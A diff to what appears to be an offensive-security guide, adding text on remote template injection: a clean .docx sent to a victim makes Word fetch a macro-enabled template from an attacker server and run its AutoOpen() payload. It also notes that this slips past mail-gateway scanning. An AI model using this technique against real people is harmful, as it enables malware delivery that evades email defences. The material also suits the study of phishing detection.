@@ -1,4 +1,11 @@
-**Remote template injection** — ship a **clean** `.docx` (no macros, no payload) that references a remote Word template (`.dotm`) over HTTP. When the victim opens the document, Word fetches the template and runs *its* macros. Because the delivered file is benign, it often sails past static mail-gateway detection.
+**Remote template injection** — deliver a completely **clean** `.docx` (no macros, no payload in the file itself) that secretly references a Word template stored on your server over HTTP. When the victim opens the document, Word reaches out, downloads that template — a macro-enabled `.dotm` — and runs *its* macros. Because the file you actually send is benign, it often sails past static mail-gateway detection, splitting your payload off from the delivered document.
+
+```
+attacker hosts template.dotm on HTTP server
+victim opens clean.docx (no macros inside)
+Word -> GET http://attacker/template.dotm
+Word runs template's AutoOpen() macro -> payload
+```
 
 ## How it works
 
